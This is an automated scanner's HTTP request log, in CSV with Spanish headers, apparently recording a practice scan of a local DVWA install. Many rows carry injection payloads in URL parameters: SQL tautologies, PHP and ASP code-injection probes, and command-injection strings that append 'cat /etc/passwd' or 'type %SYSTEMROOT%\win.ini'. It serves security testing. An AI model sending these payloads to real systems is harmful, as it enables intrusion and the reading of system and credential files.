ID,Petición (Tiempo),Marca de tiempo Respuesta,Método,URL,Código,Razón,RTT,Tamaño de la Cabecera de Respuesta,Respuesta (Tamaño del cuerpo)
2044,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27,302,Found,1,628,0
2045,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D,302,Found,1,628,0
2046,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2047,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C,302,Found,0,628,0
2048,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2049,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B,302,Found,1,628,0
2050,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2051,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%22%2Bresponse.write%28237%2C543*937%2C794%29%2B%22,302,Found,1,628,0
2052,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B,302,Found,1,628,0
2053,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=response.write%28237%2C543*937%2C794%29,302,Found,0,628,0
2054,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,4,272,1342
2055,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2056,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2057,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2058,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2059,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2060,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2061,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2062,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,5,272,1342
2063,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2064,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2065,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2066,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2067,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2068,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2069,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2070,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2071,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2072,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2073,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2074,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2075,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2076,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,0,272,1342
2077,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2078,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2079,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2080,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2081,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2082,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2083,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2084,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2085,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2086,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2087,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2088,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2089,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,281,0
2090,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1381
2091,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,281,0
2092,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2093,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2094,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1381
2095,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,281,0
2096,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=cat+%2Fetc%2Fpasswd&Submit=Submit,302,Found,0,628,0
2097,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa,301,Moved Permanently,0,208,350
2098,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa/css,301,Moved Permanently,0,212,354
2099,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26cat+%2Fetc%2Fpasswd%26&Submit=Submit,302,Found,1,628,0
2100,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,4,272,1381
2101,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bcat+%2Fetc%2Fpasswd%3B&Submit=Submit,302,Found,1,628,0
2102,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/dvwa/images,301,Moved Permanently,0,215,357
2103,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26cat+%2Fetc%2Fpasswd%26%22&Submit=Submit,302,Found,1,628,0
2104,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2105,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bcat+%2Fetc%2Fpasswd%3B%22&Submit=Submit,302,Found,1,628,0
2106,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2107,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26cat+%2Fetc%2Fpasswd%26%27&Submit=Submit,302,Found,1,628,0
2108,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2109,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bcat+%2Fetc%2Fpasswd%3B%27&Submit=Submit,302,Found,0,628,0
2111,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
2112,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities,301,Moved Permanently,1,219,361
2110,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2113,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%26type+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
2114,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli,301,Moved Permanently,0,224,366
2115,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2116,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
2117,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22&Submit=Submit,302,Found,0,628,0
2118,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,0,628,0
2119,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2120,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27&Submit=Submit,302,Found,2,628,0
2121,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini&Submit=Submit,302,Found,1,628,0
2122,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2123,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=get-help&Submit=Submit,302,Found,1,628,0
2124,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2125,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help&Submit=Submit,302,Found,1,628,0
2126,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%22%3Bget-help&Submit=Submit,302,Found,1,628,0
2127,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2128,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%27%3Bget-help&Submit=Submit,302,Found,1,628,0
2129,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2130,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271%3Bget-help+%23&Submit=Submit,302,Found,1,628,0
2131,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2132,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=cat+%2Fetc%2Fpasswd,302,Found,2,647,0
2134,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2133,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26cat+%2Fetc%2Fpasswd%26,302,Found,1,628,0
2135,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bcat+%2Fetc%2Fpasswd%3B,302,Found,0,628,0
2136,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2137,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26cat+%2Fetc%2Fpasswd%26%22,302,Found,1,628,0
2138,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2139,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bcat+%2Fetc%2Fpasswd%3B%22,302,Found,1,628,0
2140,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2141,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26cat+%2Fetc%2Fpasswd%26%27,302,Found,1,628,0
2142,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bcat+%2Fetc%2Fpasswd%3B%27,302,Found,0,628,0
2143,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2144,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
2145,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%26type+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
2146,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2147,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
2148,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22,302,Found,1,628,0
2149,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2150,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,1,628,0
2151,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27,302,Found,0,628,0
2153,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2152,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini,302,Found,0,628,0
2154,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=get-help,302,Found,1,628,0
2155,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help,302,Found,1,628,0
2156,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,3,272,1342
2157,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%22%3Bget-help,302,Found,1,628,0
2158,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%27%3Bget-help,302,Found,1,628,0
2159,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit%3Bget-help+%23,302,Found,1,628,0
2160,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,3,426,0
2161,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2162,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2163,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2164,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2165,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2166,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2167,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2168,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2169,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2170,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2171,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2172,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2173,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2174,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2175,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2176,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2177,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2178,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2179,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2180,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2181,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2182,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2183,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2184,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2185,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,2,272,1342
2186,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2187,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2188,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,2,426,0
2189,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,1,272,1342
2190,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
2191,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,GET,http://localhost/dvwa/login.php,200,OK,0,272,1342
2192,Thu Mar 19 12:03:22 CST 2026,Thu Mar 19 12:03:22 CST 2026,POST,http://localhost/dvwa/login.php,302,Found,1,426,0
